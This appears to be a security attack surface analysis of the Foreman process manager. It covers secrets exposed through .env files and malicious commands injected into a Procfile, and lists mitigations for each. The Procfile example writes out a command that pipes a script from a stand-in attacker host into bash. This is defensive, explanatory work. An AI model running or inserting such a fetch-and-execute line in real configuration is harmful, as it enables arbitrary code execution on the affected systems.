# Attack Surface Analysis for ddollar/foreman

## Attack Surface: [Sensitive Data Exposure via Environment Variables](./attack_surfaces/sensitive_data_exposure_via_environment_variables.md)

*   **Description:** Exposure of confidential information (API keys, database passwords, secret tokens) through improperly managed environment variables.
    *   **How Foreman Contributes:** Foreman loads environment variables from `.env` files (or other sources) and makes them accessible to managed processes. This is Foreman's *primary* contribution to this attack surface. The mechanism of loading and providing these variables is the core risk.
    *   **Example:** A developer accidentally commits a `.env` file containing a production database password to a public GitHub repository. An attacker finds the repository and gains access to the database. Foreman, by design, would have loaded this password and made it available to the application.
    *   **Impact:** Complete compromise of sensitive data, potentially leading to data breaches, financial loss, reputational damage, and legal consequences.
    *   **Risk Severity:** **Critical**
    *   **Mitigation Strategies:**
        *   **Never commit `.env` files:** Add `.env*` to `.gitignore`. This is the most crucial step.
        *   **Use a secrets manager:** Employ a dedicated secrets management solution (e.g., HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, Google Cloud Secret Manager). Configure Foreman to read secrets from the secrets manager's API, *not* from `.env` files. This is the recommended best practice.
        *   **Environment-specific configuration:** Use different `.env` files for different environments (development, staging, production) *only for non-sensitive settings*. Production secrets should *always* come from a secrets manager.
        *   **Least privilege:** Only provide the necessary environment variables to each process. Avoid a single, global `.env` file. Use Foreman's features (if available) or shell scripting to selectively set variables for specific processes.
        *   **Regular audits:** Periodically review `.env` files (if used for non-sensitive data) and environment variable usage to ensure no sensitive data is exposed.
        *   **Education:** Train developers on secure environment variable management practices, emphasizing the risks associated with Foreman's behavior.

## Attack Surface: [Malicious Process Execution via `Procfile` Manipulation](./attack_surfaces/malicious_process_execution_via__procfile__manipulation.md)

*   **Description:** An attacker gains the ability to modify the `Procfile` and inject malicious commands or alter existing process definitions.
    *   **How Foreman Contributes:** Foreman's *core function* is to execute processes as defined in the `Procfile`. This direct execution based on the `Procfile` content is the attack surface.
    *   **Example:** An attacker compromises a developer's machine and modifies the `Procfile` to include a command that downloads and executes a malicious script (e.g., `web: curl http://attacker.com/evil.sh | bash`). When Foreman restarts the application (or starts it), the malicious script is executed.
    *   **Impact:** Arbitrary code execution on the server, potentially leading to complete system compromise, data theft, and denial of service.
    *   **Risk Severity:** **High**
    *   **Mitigation Strategies:**
        *   **Secure the `Procfile`:** Treat the `Procfile` as a critical configuration file. Use strict file system permissions to prevent unauthorized modification.
        *   **Code review:** Implement mandatory code reviews for *all* changes to the `Procfile`.
        *   **Version control:** Track changes to the `Procfile` in version control and monitor for suspicious modifications.
        *   **Read-only filesystem (Production):** Deploy the application and `Procfile` to a read-only filesystem in production to prevent runtime modifications. This is a strong mitigation.
        *   **Configuration management:** Use a configuration management tool (Ansible, Chef, Puppet) to manage the `Procfile` and ensure its integrity. This helps enforce a desired state.
        *   **Process monitoring:** Monitor running processes for unexpected behavior or deviations from the expected `Procfile` configuration. This is a detective control.
